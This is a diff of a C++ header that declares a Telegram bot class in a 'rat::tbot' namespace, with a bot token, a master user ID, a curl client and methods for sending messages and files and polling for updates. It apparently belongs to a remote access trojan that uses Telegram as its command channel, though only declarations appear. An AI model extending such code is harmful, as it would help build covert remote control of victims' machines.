@@ -25,7 +25,6 @@ namespace rat::tbot {
 using MessageResponseBuffer       = std::array<char, TELEGRAM_BOT_API_MESSAGE_RESPONSE_BUFFER_SIZE>;
 using FileOperationResponseBuffer = std::array<char, TELEGRAM_BOT_API_FILE_OPERATION_RESPONSE_BUFFER_SIZE>;
 using UpdateBuffer                = std::array<char, TELEGRAM_BOT_API_UPDATE_BUFFER_SIZE>;
-using json                        = nlohmann::json;
 
 class Bot {
 private:
@@ -42,23 +41,24 @@ private:
     std::string sending_video_url;
     std::string sending_voice_url;
 
-    std::string getting_file_url;
     std::string getting_update_url;
-
+    std::string getting_file_url;
 public:
     /*This is because the bot gets copied inside certain threads, use its client to limit creating another handler*/
-
+    
     rat::networking::Client curl_client;
     
     Bot(const std::string& arg_Token, int64_t Master_Id, uint8_t Telegram_Connection_Timemout = 20);
-    Bot(const Bot& other);// constructs new Client with its own CURL handle
-    
+    Bot(const Bot& Other_Bot);// constructs new Client with its own CURL handle, copies everythign, very expensive
+
     std::string getToken() const;
     int64_t getMasterId() const;
     int64_t getLastUpdateId() const;
     void setUpdateIterval(uint16_t Update_Interval);
     void setOffset(); // only for bots handling updates, not for sender-only bots
 
+    std::string getBotFileUrl(void);
+    
     BotResponse sendMessage(const std::string& Text_Message) ;
     BotResponse sendMessage(const char* Text_Message);
     
